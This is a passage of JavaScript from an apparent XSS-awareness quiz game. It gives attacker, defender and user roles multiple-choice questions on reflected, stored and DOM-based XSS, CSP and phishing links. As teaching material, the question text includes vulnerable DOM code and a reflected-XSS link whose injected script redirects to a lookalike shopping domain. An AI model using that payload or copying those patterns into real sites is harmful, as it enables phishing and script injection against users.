            document.getElementById("questionTextContainer1").innerText = "<script> function chooseTab(name) { var html = 'Image ' + parseInt(name) + '<br>'; html += '<img src='/static/myshopping/store' + name + '.jpg' />'; … window.onload = function() {  if (self.location.hash) { chooseTab(self.location.hash.substr(1)); } else {…";


            document.getElementById("questionTileText1").innerText = "The website is vulnerable to DOM-Based XSS";
            document.getElementById("questionTileText2").innerText = "Attackers can inject malicious scripts by modifying the URL hash";
            document.getElementById("questionTileText3").innerText = "Attackers can possibly alter the website's appearance by embedding an image of their choice from an external source";
            document.getElementById("questionTileText4").innerText = "This can be exploited using a reflected XSS attack";


            calculateTileOrder();
            reorderQuestionTiles();

        } else if (currentLevelNo == 8) {

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }



            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));

            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");
            const InteractivityButton1Variable = document.getElementById("InteractivityButton1");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 1.6vw;font-weight: bold;position:fixed;top:43%;left:15%;width: 58%;word-wrap: break-word;line-height: normal;z-index: -1;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.3vw;position:fixed;top:60%;left:15%;font-weight: bold;background-color: #000000;width: 55%;visibility: visible;z-index: 0;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:4%;left:10%;height:45%; width:70%;z-index: 0;visibility: visible;");
            document.getElementById("questionTextContainer1").style.visibility = "visible";
            document.getElementById("questionImageContainer").style.visibility = "visible";
            InteractivityButton1Variable.setAttribute("style", "position:fixed;top:23%;left:65%;z-index: 1;height: 8%;width: 4%;visibility: visible;");

            document.getElementById("questionImageContainer").src = "images/levels/Attacker-L3-2-Username-LS.png";

            document.getElementById("questionHeadingContainer").innerHTML = "Question 2";
            document.getElementById("questionTextContainer").innerHTML = "While reviewing the security of your e-commerce platform, you identify another issue where user-provided data from localStorage is used in the DOM to provide personalization (display a welcome message with username): <br><br><br><br><br>Which of the following statements are true?";
            document.getElementById("questionTextContainer1").innerText = "let username = localStorage.getItem('username');\n document.getElementById('welcomeMessage').textContent = 'Welcome, ' + username;";


            document.getElementById("questionTileText1").innerText = "DOM-based XSS attacks can occur if an attacker injects malicious scripts into localStorage";
            document.getElementById("questionTileText2").innerText = "Stored XSS attacks are possible because the data persists even after page reloads";
            document.getElementById("questionTileText3").innerText = "localStorage data is stored on the server";
            document.getElementById("questionTileText4").innerText = "If a website inserts unescaped and unsanitized data into localStorage, a DOM based XSS vulnerability exists";


            calculateTileOrder();
            reorderQuestionTiles();

        } else if (currentLevelNo == 9) {

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }



            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));

            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 2vw;font-weight: bold;position:fixed;top:10%;left:15%;width: 55%;word-wrap: break-word;line-height: normal;z-index: 0;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.25vw;position:fixed;top:10%;left:15%;font-weight: bold;background-color: #000000;width: 60%;visibility: visible;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:4%;left:15%;transform: scale(0.75, 0.75);z-index: 0;visibility: visible;");
            document.getElementById("questionTextContainer1").style.visibility = "hidden";
            document.getElementById("questionImageContainer").style.visibility = "hidden";
            document.getElementById("InteractivityButton1").style.visibility = "hidden";

            document.getElementById("questionHeadingContainer").innerHTML = "Question 3";
            document.getElementById("questionTextContainer").innerHTML = "In the last steps, it was discovered that the e-commerce webpage is vulnerable to JS injection. Moreover, it was further discovered that the e-commerce website is vulnerable to reflected, stored and DOM based XSS attacks. <br><br> <br> Which of the following statements are true?";



            document.getElementById("questionTileText1").innerText = "DOM-based XSS occurs when the server modifies the response with user input before sending it to the client";
            document.getElementById("questionTileText2").innerText = "In a Stored XSS attack, the malicious script is executed only when an administrator logs into the website";
            document.getElementById("questionTileText3").innerText = "DOM-based XSS occurs when client-side JavaScript processes and executes untrusted user input within the webpage";
            document.getElementById("questionTileText4").innerText = "All types of XSS attacks can be prevented/mitigated by properly escaping and sanitizing user input";


            calculateTileOrder();
            reorderQuestionTiles();
            initialTimerStarted = false;
        }

    } else if (roleId == 1) {

        $('div#mainUI').hide();
        $('div#pageFooter').hide();
        $('div#selectPlayerNameUI').hide();
        $('div#selectPlayerRoleUI').hide();
        $('div#preGameQuestionnaireUI').hide();
        $('div#levelUI').show();
        $('div#postGameQuestionnaireUI').hide();
        $('div#leaderboardUI').hide();
        $('div#exitGameUI').hide();

        if (currentLevelNo == 1 || currentLevelNo == 200) {

            if (!initialTimerStarted) {

                initialTimerStarted = true;
                setTimeout(startLevelTimer, 10000);
            }


            $('#level1gif').fadeIn(0);
            document.getElementById('level1gif').style.visibility = "visible";
            $('#level1gif').fadeOut(4000);

            if (rolesPlayed.length == 0) {
                setTimeout(showinteractivityInfoPopUp, 5000);
            }


            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }

            document.getElementById("questionImageContainer").src = "images/levels/Attacker-L1-1.png";

            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");
            const InteractivityButton1Variable = document.getElementById("InteractivityButton1");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 1.8vw;font-weight: bold;position:fixed;top:43%;left:5%;width: 68%;word-wrap: break-word;line-height: normal;z-index: 0;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.25vw;position:fixed;top:40%;left:15%;font-weight: bold;background-color: #000000;width: 50%;visibility: visible;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:5%;left:10%;height:45%;width:70%;z-index: 0;visibility: visible;");

            InteractivityButton1Variable.setAttribute("style", "position:fixed;top:20%;left:46%;z-index: 1;height: 8%;width: 4%;visibility: visible;");

            document.getElementById("questionHeadingContainer").innerHTML = "Question 1";
            document.getElementById("questionTextContainer").innerHTML = "Imagine a popular e-commerce platform that allows users to buy different items online. You are one of the developers of this website and have been tasked with checking the security of the platform. The website has a search function which displays the search string in the URL, like this: <br> <span style='color:red;background-color:black;'>https://myshopping.com?search=iPad</span> <br> <br> What could be your steps to secure the system of XSS vulnerabilities?";

            document.getElementById("questionTileText1").innerText = "Identifying that this setup can be used for reflected XSS attacks";
            document.getElementById("questionTileText2").innerText = "Identifying that this setup can be used for stored XSS attacks";
            document.getElementById("questionTileText3").innerText = "Escape and sanitize user input to the website";
            document.getElementById("questionTileText4").innerText = "Enable HTTPS for the website";
            document.getElementById("questionTextContainer1").style.visibility = "hidden";


            calculateTileOrder();
            reorderQuestionTiles();
        } else if (currentLevelNo == 2) {

            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }

            document.getElementById("questionImageContainer").src = "images/levels/Attacker-L2-1.png";

            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");
            const InteractivityButton1Variable = document.getElementById("InteractivityButton1");


            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 2vw;font-weight: bold;position:fixed;top:48%;left:5%;width: 65%;word-wrap: break-word;line-height: normal;z-index: 0;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.25vw;position:fixed;top:10%;left:15%;font-weight: bold;background-color: #000000;width: 1550px;visibility: visible;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:4%;left:10%;height:50%;width:70%;z-index: 0;visibility: visible;");
            InteractivityButton1Variable.setAttribute("style", "position:fixed;top:23%;left:50%;z-index: 1;height: 8%;width: 4%;");
            document.getElementById("InteractivityButton1").style.visibility = "visible";

            document.getElementById("questionHeadingContainer").innerHTML = "Question 2";
            document.getElementById("questionTextContainer").innerHTML = "Imagine a popular e-commerce platform that allows users to submit comments on their shopping experience. You are one of the developers of this website and have been tasked with checking the security of the platform.<br> <br>What could be your steps to make the system more secure from XSS attacks?";



            document.getElementById("questionTileText1").innerText = "Allow the user to submit whatever type of data they prefer";
            document.getElementById("questionTileText2").innerText = "Identifying that this setup can be used for reflected XSS attacks";
            document.getElementById("questionTileText3").innerText = "Identifying that this setup can be used for stored XSS attacks";
            document.getElementById("questionTileText4").innerText = "Escaping and sanitizing any input that is submitted by the user";
            document.getElementById("questionTextContainer1").style.visibility = "hidden";


            calculateTileOrder();
            reorderQuestionTiles();
        } else if (currentLevelNo == 3) {

            $('#level2gif').fadeIn(0);
            document.getElementById('level2gif').style.visibility = "visible";
            $('#level2gif').fadeOut(4000);


            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }

            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");
            const InteractivityButton1Variable = document.getElementById("InteractivityButton1");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 1.3vw;font-weight: bold;position:fixed;top:45%;left:1%;width: 73%;word-wrap: break-word;line-height: normal;z-index: -1;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.25vw;position:fixed;top:63%;left:3%;font-weight: bold;background-color: #000000;width: 70%;visibility: visible;z-index:0;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:-2%;left:13%;height:55%;width:55%;z-index: 0;visibility: visible;");
            document.getElementById("questionTextContainer1").style.visibility = "visible";
            document.getElementById("questionImageContainer").style.visibility = "visible";
            document.getElementById("InteractivityButton1").style.visibility = "visible";

            InteractivityButton1Variable.setAttribute("style", "position:fixed;top:12%;left:38%;z-index: 1;height: 8%;width: 4%;");


            document.getElementById("questionImageContainer").src = "images/levels/Attacker-L3-1.png";

            document.getElementById("questionHeadingContainer").innerHTML = "Question 1";
            document.getElementById("questionHeadingContainer").style.top = "-3%";
            document.getElementById("questionTextContainer").innerHTML = "A popular e-commerce website has an image tab that dynamically updates the webpage using JavaScript. In this case, the URL fragment (the part after #, which isn’t sent to the server) acts as input for a client-side script, directing the browser on which tab to show. <span style='color:red;background-color:black;'>(https://myshopping.com/store#Paris) </span> <br> You analyze the website's JavaScript and find the following vulnerable code:<br><br><br><br><br>What could be your steps to make the system more secure from XSS attacks?";
            document.getElementById("questionTextContainer1").innerText = "<script> function chooseTab(name) { var html = 'Image ' + parseInt(name) + '<br>'; html += '<img src='/static/myshopping/store' + name + '.jpg' />'; … window.onload = function() {  if (self.location.hash) { chooseTab(self.location.hash.substr(1)); } else {…";


            document.getElementById("questionTileText1").innerText = "Use input escape/sanitization to remove potentially harmful characters before processing";
            document.getElementById("questionTileText2").innerText = "Use a whitelist approach to validate and restrict input types to allow only predefined tab names";
            document.getElementById("questionTileText3").innerText = "Implement Content Security Policy (CSP) to block inline scripts and external script injections";
            document.getElementById("questionTileText4").innerText = "Use a VPN";


            calculateTileOrder();
            reorderQuestionTiles();
        } else if (currentLevelNo == 4) {


            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }

            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");
            const InteractivityButton1Variable = document.getElementById("InteractivityButton1");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 1.6vw;font-weight: bold;position:fixed;top:43%;left:15%;width: 58%;word-wrap: break-word;line-height: normal;z-index: -1;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.3vw;position:fixed;top:60%;left:15%;font-weight: bold;background-color: #000000;width: 55%;visibility: visible;z-index: 0;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:4%;left:10%;height:45%; width:70%;z-index: 0;visibility: visible;");
            document.getElementById("questionTextContainer1").style.visibility = "visible";
            document.getElementById("questionImageContainer").style.visibility = "visible";
            InteractivityButton1Variable.setAttribute("style", "position:fixed;top:25%;left:60%;z-index: 1;height: 8%;width: 4%;visibility: visible;");

            document.getElementById("questionImageContainer").src = "images/levels/Attacker-L3-2-Username-LS.png";

            document.getElementById("questionHeadingContainer").innerHTML = "Question 2";
            document.getElementById("questionTextContainer").innerHTML = "While reviewing the security of your e-commerce platform, you identify another issue where user-provided data from localStorage is used in the DOM to provide personalization (display a welcome message with username): <br><br><br><br>What could you do to secure the platform against XSS attacks?";
            document.getElementById("questionTextContainer1").innerText = "let username = localStorage.getItem('username');\n document.getElementById('welcomeMessage').textContent = 'Welcome, ' + username;";


            document.getElementById("questionTileText1").innerText = "Escape and sanitize input before storing or displaying It";
            document.getElementById("questionTileText2").innerText = "Implement a Content Security Policy (CSP)";
            document.getElementById("questionTileText3").innerText = "Avoid storing sensitive data in or restrict access to localStorage";
            document.getElementById("questionTileText4").innerText = "Encrypt the username ";


            calculateTileOrder();
            reorderQuestionTiles();

        } else if (currentLevelNo == 5) {

            $('#level3gif').fadeIn(0);
            document.getElementById('level3gif').style.visibility = "visible";
            $('#level3gif').fadeOut(4000);


            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }

            document.getElementById("questionImageContainer").src = "images/levels/Defender-L3-1.png";

            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");
            const InteractivityButton1Variable = document.getElementById("InteractivityButton1");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 1.8vw;font-weight: bold;position:fixed;top:50%;left:3%;width: 70%;word-wrap: break-word;line-height: normal;z-index: 0;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.25vw;position:fixed;top:10%;left:15%;font-weight: bold;background-color: #000000;width: 50%;visibility: visible;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:4%;left:10%;height:53%;width:70%;z-index: 0;visibility: visible;");
            InteractivityButton1Variable.setAttribute("style", "position:fixed;top:25%;left:55%;z-index: 1;height: 8%;width: 4%;");
            document.getElementById("InteractivityButton1").style.visibility = "visible";

            document.getElementById("questionHeadingContainer").innerHTML = "Question 1";
            document.getElementById("questionTextContainer").innerHTML = "As one of the developers of the e-commerce site, you have been tasked with checking the security of the platform. In addition to validating and sanitizing user submitted data, a Content Security Policy (CSP) can be developed as an added layer of security against XSS attacks.<br> What can be done using a Content Security Policy (CSP)?";



            document.getElementById("questionTileText1").innerText = "A HTTP security header that can help mitigate XSS attacks";
            document.getElementById("questionTileText2").innerText = "Monitor, control and report disputed resource loading on web pages";
            document.getElementById("questionTileText3").innerText = "Help secure user Wi-Fi networks";
            document.getElementById("questionTileText4").innerText = "Enable HTTPS for the website";
            document.getElementById("questionTextContainer1").style.visibility = "hidden";


            calculateTileOrder();
            reorderQuestionTiles();
        } else if (currentLevelNo == 6) {


            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }

            document.getElementById("questionImageContainer").src = "images/levels/Defender-L3-1.png";

            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 2vw;font-weight: bold;position:fixed;top:10%;left:15%;width: 58%;word-wrap: break-word;line-height: normal;z-index: 0;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.25vw;position:fixed;top:10%;left:15%;font-weight: bold;background-color: #000000;width: 1550px;visibility: visible;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:15%;left:35%;transform: scale(1.5, 1.5);z-index: 0;visibility: visible;");

            document.getElementById("questionHeadingContainer").innerHTML = "Question 2";
            document.getElementById("questionTextContainer").innerHTML = "Out of the following statements regarding XSS attacks, which ones are correct?";



            document.getElementById("questionTileText1").innerText = "Not all web applications are vulnerable to XSS attacks";
            document.getElementById("questionTileText2").innerText = "XSS issues can be fixed by just changing client side validation";
            document.getElementById("questionTileText3").innerText = "Data received by a web application can be considered as “always” secure";
            document.getElementById("questionTileText4").innerText = "XSS Attacks can be hard to detect since they often manipulate perfectly legitimate web application";
            document.getElementById("questionTextContainer1").style.visibility = "hidden";
            document.getElementById("questionImageContainer").style.visibility = "hidden";
            document.getElementById("InteractivityButton1").style.visibility = "hidden";


            calculateTileOrder();
            reorderQuestionTiles();
            initialTimerStarted = false;
        }
    } else if (roleId == 2) {
        $('div#mainUI').hide();
        $('div#pageFooter').hide();
        $('div#selectPlayerNameUI').hide();
        $('div#selectPlayerRoleUI').hide();
        $('div#preGameQuestionnaireUI').hide();
        $('div#levelUI').show();
        $('div#postGameQuestionnaireUI').hide();
        $('div#leaderboardUI').hide();
        $('div#exitGameUI').hide();

        if (currentLevelNo == 1 || currentLevelNo == 200) {

            if (!initialTimerStarted) {

                initialTimerStarted = true;
                setTimeout(startLevelTimer, 10000);
            }



            $('#level1gif').fadeIn(0);
            document.getElementById('level1gif').style.visibility = "visible";
            $('#level1gif').fadeOut(4000);

            if (rolesPlayed.length == 0) {
                setTimeout(showinteractivityInfoPopUp, 5000);
            }


            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }

            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");
            const questionInteractivityButtonVariable = document.getElementById("InteractivityButton1");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 2vw;font-weight: bold;position:fixed;top:10%;left:15%;width: 58%;word-wrap: break-word;line-height: normal;z-index: -1;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.5vw;position:fixed;top:40%;left:15%;font-weight: bold;background-color: #000000;width: 58%;visibility: visible;line-height: normal;z-index: 0;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:4%;left:15%;transform: scale(0.75, 0.75);z-index: 0;visibility: visible;");
            questionInteractivityButtonVariable.setAttribute("style", "position:fixed;top:37.5%;left:60%;z-index: 1;visibility: visible;height: 8%;width: 4%;");

            document.getElementById("questionHeadingContainer").innerHTML = "Question 1";
            document.getElementById("questionTextContainer").innerHTML = "You receive a text message/email with the following link that appears to contain a reference to a popular e-commerce website that you visit regularly. The message states about an on-going sale with discounts up to 70% and a discount code to be entered at check out to receive the discount. <br><br><br><br>What should your next steps be?";

            document.getElementById("questionImageContainer").style.visibility = "hidden";
            document.getElementById("questionTextContainer1").innerText = "https://myshopping.com?search=<script>window.location.replace('http://myshoping.com');</script>";

            document.getElementById("questionTileText1").innerText = "Click on the link and visit the website since you are a regular user of the e-commerce website";
            document.getElementById("questionTileText2").innerText = "Provide login info and submit the discount code to claim the discount";
            document.getElementById("questionTileText3").innerText = "Not clicking any suspicious or even legitimate looking links ";
            document.getElementById("questionTileText4").innerText = "Report and confirm the legitimacy of the link with the e-commerce company ";


            calculateTileOrder();
            reorderQuestionTiles();

        } else if (currentLevelNo == 2) {


            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }

            document.getElementById("questionImageContainer").src = "images/levels/User-L2-1.png";

            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");
            const questionInteractivityButtonVariable = document.getElementById("InteractivityButton1");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 2vw;font-weight: bold;position:fixed;top:55%;left:10%;width: 60%;word-wrap: break-word;line-height: normal;z-index: 0;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.25vw;position:fixed;top:10%;left:15%;font-weight: bold;background-color: #000000;width: 1550px;visibility: visible;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:5%;left:7%;height:55%;width:75%;z-index: 0;visibility: visible;");
            questionInteractivityButtonVariable.setAttribute("style", "position:fixed;top:20%;left:40%;z-index: 1;visibility: visible;height: 8%;width: 4%;");

            document.getElementById("questionHeadingContainer").innerHTML = "Question 2";
            document.getElementById("questionTextContainer").innerHTML = "After visiting a popular e-commerce platform that you visit regularly, you are redirected and/or you get alerts to login to your email or social media account, with a session timed out notice.  <br> What should your next steps be?";



            document.getElementById("questionTextContainer1").style.visibility = "hidden";
            document.getElementById("questionTileText1").innerText = "Login to my email and social media account since the logged in session must have timed out";
            document.getElementById("questionTileText2").innerText = "Login to my email and social media account since I trust the blogging platform not to have any malicious intents";
            document.getElementById("questionTileText3").innerText = "Not providing the login info and closing the web browser";
            document.getElementById("questionTileText4").innerText = "Not visit the blogging site again or disable JavaScript for the blogging site when revisiting";


            calculateTileOrder();
            reorderQuestionTiles();

        } else if (currentLevelNo == 3) {

            $('#level2gif').fadeIn(0);
            document.getElementById('level2gif').style.visibility = "visible";
            $('#level2gif').fadeOut(4000);


            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }

            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 2vw;font-weight: bold;position:fixed;top:10%;left:15%;width: 58%;word-wrap: break-word;line-height: normal;z-index: 0;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.25vw;position:fixed;top:10%;left:15%;font-weight: bold;background-color: #000000;width: 1550px;visibility: visible;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:4%;left:15%;transform: scale(0.75, 0.75);z-index: 0;visibility: visible;");

            document.getElementById("questionImageContainer").style.visibility = "hidden";
            document.getElementById("questionTextContainer1").style.visibility = "hidden";
            document.getElementById("InteractivityButton1").style.visibility = "hidden";

            document.getElementById("questionHeadingContainer").innerHTML = "Question 1";
            document.getElementById("questionTextContainer").innerHTML = "You receive a text message/email from a popular e-commerce website that you visit regularly regarding a new order that has been placed. However, you have not recently placed an order but you currently have an active session with the e-commerce website with saved credit card information. <br> <br> What should your next steps be?";


            document.getElementById("questionTileText1").innerText = "Do nothing since this must have been an order that I have placed in the history";
            document.getElementById("questionTileText2").innerText = "Immediately check the placed order to make sure it was indeed placed by you";
            document.getElementById("questionTileText3").innerText = "Immediately inform the e-commerce website and the bank regarding the fraudulent order, in order to cancel it";
            document.getElementById("questionTileText4").innerText = "Ignore the notification and remove further notifications regarding new orders since it is a nuisance";


            calculateTileOrder();
            reorderQuestionTiles();

        } else if (currentLevelNo == 4) {


            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }

            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 2vw;font-weight: bold;position:fixed;top:10%;left:15%;width: 58%;word-wrap: break-word;line-height: normal;z-index: 0;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.25vw;position:fixed;top:10%;left:15%;font-weight: bold;background-color: #000000;width: 58%;visibility: visible;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:4%;left:15%;transform: scale(0.75, 0.75);z-index: 0;visibility: visible;");

            document.getElementById("questionImageContainer").style.visibility = "hidden";
            document.getElementById("questionTextContainer1").style.visibility = "hidden";
            document.getElementById("InteractivityButton1").style.visibility = "hidden";

            document.getElementById("questionHeadingContainer").innerHTML = "Question 2";
            document.getElementById("questionTextContainer").innerHTML = "After learning about the serious effects of XSS attacks, you decide to protect yourself from XSS attacks as much as possible. You realize that XSS attacks can best be prevented from the developers side. However, you are determined to do your part to mitigate XSS attacks. <br> <br>What should your next steps be?";


            document.getElementById("questionTileText1").innerText = "Not clicking any suspicious or even legitimate looking links  without confirm the legitimacy of the link with respective source";
            document.getElementById("questionTileText2").innerText = "Using a strong Wi-Fi password";
            document.getElementById("questionTileText3").innerText = "Using a VPN";
            document.getElementById("questionTileText4").innerText = "Disabling JavaScript (JS) execution for websites by default and only give JS execution permission to sites that you explicitly trust";


            calculateTileOrder();
            reorderQuestionTiles();
            initialTimerStarted = false;

        }

    }

    if (currentLevelNo == 100) {
        currentLevelNo = 200;

        $('div#mainUI').hide();
        $('div#pageFooter').hide();
        $('div#selectPlayerNameUI').hide();
        $('div#selectPlayerRoleUI').show();
        $('div#preGameQuestionnaireUI').hide();
        $('div#levelUI').hide();
        $('div#postGameQuestionnaireUI').hide();
        $('div#leaderboardUI').hide();
        $('div#exitGameUI').hide();
        roleId = 100;



        if (Math.ceil(OverallSimZoneSkillsValue) == 100) {
            document.getElementById("simZoneCompletedBadge").style.opacity = "100%";
            document.getElementById("simZoneCompletedBadgeMini").style.opacity = "100%";
            playerRolesPlayed = playerRolesPlayed.concat("SimZone,");

        }


        if (LastPlayedRole == "Attacker") {
            document.getElementById("labelPlayerRoleAttacker").style.visibility = "hidden";
            document.getElementById("playerRoleavatar0").style.visibility = "hidden";
            document.getElementById("attackerRoleCompletedBadge").style.opacity = "100%";
            document.getElementById("attackerRoleCompletedBadgeMini").style.opacity = "100%";
            awardedBadgeId = 0;
            playerRolesPlayed = playerRolesPlayed.concat("Attacker,");
            openPlayerStatsZone("Attacker-Completed");

        }
        if (LastPlayedRole == "Defender") {
            document.getElementById("labelPlayerRoleDefender").style.visibility = "hidden";
            document.getElementById("playerRoleavatar1").style.visibility = "hidden";
